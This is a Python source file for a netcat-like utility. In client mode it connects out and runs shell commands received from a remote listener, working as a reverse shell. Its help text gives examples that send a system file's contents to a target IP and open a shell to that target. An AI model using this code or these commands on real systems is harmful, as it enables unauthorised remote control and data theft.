import argparse
import socket
import shlex
import subprocess
import sys
import textwrap

# Constants
EXECUTE_CODE = b'>EXE'
SHELL_CODE = b'>CMD'
EXIT_CODE = b'!EXIT\n'
END_OF_COMMAND_CODE = '\n'
DATA_BUFFER_SIZE = 4096
CMD_BUFFER_SIZE = 64

def executeShellCommand(cmd: str) -> bytes:
    '''Execute a shell command and return the output.'''
    cmd = cmd.strip()
    if not cmd:
        return
    print(f'[*] Executing command: {cmd}.')
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output

def manageConnectionWithServer(args: argparse.Namespace) -> None:
    '''Manage connection with server.'''
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            print(f'[*] Connecting to {args.target}:{args.port}.')
            client.connect((args.target, args.port))
        except OSError as msg:
            print(f'[!] Unable to connect to {args.target}:{args.port}.')
            print(f'[!] Error: {msg}.')
            sys.exit()
        if args.execute:
            client.send(EXECUTE_CODE)
            commandOutput = executeShellCommand(args.execute)
            client.send(commandOutput)
        elif args.command:
            command = b''
            client.send(SHELL_CODE)
            while True:
                try:
                    while END_OF_COMMAND_CODE not in command.decode():
                        command += client.recv(CMD_BUFFER_SIZE)
                    if command == EXIT_CODE:
                        break
                    commandOutput = executeShellCommand(command.decode())
                    if commandOutput:
                        client.send(commandOutput)
                    else:
                        client.send(b'Ok')
                    command = b''
                except KeyboardInterrupt:
                    break
        print(f'[*] Connection with {args.target}:{args.port} terminated.')

def manageConnectionWithClient(client: socket.socket, address) -> None:
    '''Manage connection with client.'''
    with client:
        data = client.recv(4)
        if data == EXECUTE_CODE:
            commandOutput = ''
            while True:
                data = client.recv(DATA_BUFFER_SIZE)
                receivedLength = len(data)
                commandOutput += data.decode()
                if receivedLength < DATA_BUFFER_SIZE:
                    break
            if commandOutput:
                print(commandOutput)
        elif data == SHELL_CODE:
            while True:
                command = input('> ')
                if command.strip() == 'exit':
                    client.send(EXIT_CODE)
                    break
                command += END_OF_COMMAND_CODE
                client.send(command.encode())
                commandOutput = ''
                while True:
                    data = client.recv(DATA_BUFFER_SIZE)
                    receivedLength = len(data)
                    commandOutput += data.decode()
                    if receivedLength < DATA_BUFFER_SIZE:
                        break
                print(commandOutput)
        print(f'[*] Connection with {address[0]}:{address[1]} terminated.')

def setupServer(args: argparse.Namespace) -> None:
    '''Setup server: listen to incoming connection.'''
    ip = socket.gethostbyname(socket.gethostname())
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((ip, args.port))
        except OSError as msg:
            print(f'[!] Unable to setup {ip}:{args.port} for listening.')
            print(f'[!] Error: {msg}.')
            return
        print(f'[*] Listening on {ip}:{args.port}')
        server.listen(1)
        while True:
            try:
                client, address = server.accept()
                print(f'[*] Accepted connection from {address[0]}:{address[1]}')
                manageConnectionWithClient(client, address)
            except KeyboardInterrupt:
                print(f'[*] Listening on {ip}:{args.port} terminated.')
                sys.exit()

parser = argparse.ArgumentParser(prog='Netcat', 
                                 description='Netcat utility for networking.',
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog=textwrap.dedent('''Examples:
    Netcat -p 5555 -l                                               # listen to incoming connection
    Netcat -t 192.168.1.10 -p 5555 -e=\"cat /etc/password\"           # execute a command and send the result to the target
    Netcat -t 192.168.1.10 -p 5555 -c                               # run a shell and connect to the target
                                 '''))
parser.add_argument('-t', '--target', type=str, help='The IPv4 address to connect to.')
parser.add_argument('-p', '--port', type=int, default=5555, help='The port number to open or connect to.')
parser.add_argument('-c', '--command', action='store_true', help='Run a command shell.')
parser.add_argument('-e', '--execute', type=str, help='Execute a command.')
parser.add_argument('-l', '--listen', action='store_true', help='Listen to incoming connections.')

args = parser.parse_args()

if args.listen:
    setupServer(args)
else:
    manageConnectionWithServer(args)
